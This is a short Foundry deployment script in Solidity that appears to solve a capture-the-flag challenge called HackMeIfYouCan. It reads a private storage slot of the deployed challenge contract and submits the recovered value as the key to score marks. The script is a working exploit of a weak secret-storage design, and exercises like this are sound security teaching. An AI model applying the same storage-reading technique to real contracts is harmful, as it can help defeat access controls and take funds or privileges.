// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";

contract SendKeyScript is Script {
    HackMeIfYouCan public hackMeIfYouCan;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        hackMeIfYouCan = HackMeIfYouCan(payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9));

        bytes32 dataValue = vm.load(address(hackMeIfYouCan), bytes32(uint256(16)));
        
        hackMeIfYouCan.sendKey(bytes16(dataValue));

        console.log("Marks after sending key:", hackMeIfYouCan.getMarks(tx.origin));
        vm.stopBroadcast();
    }
}
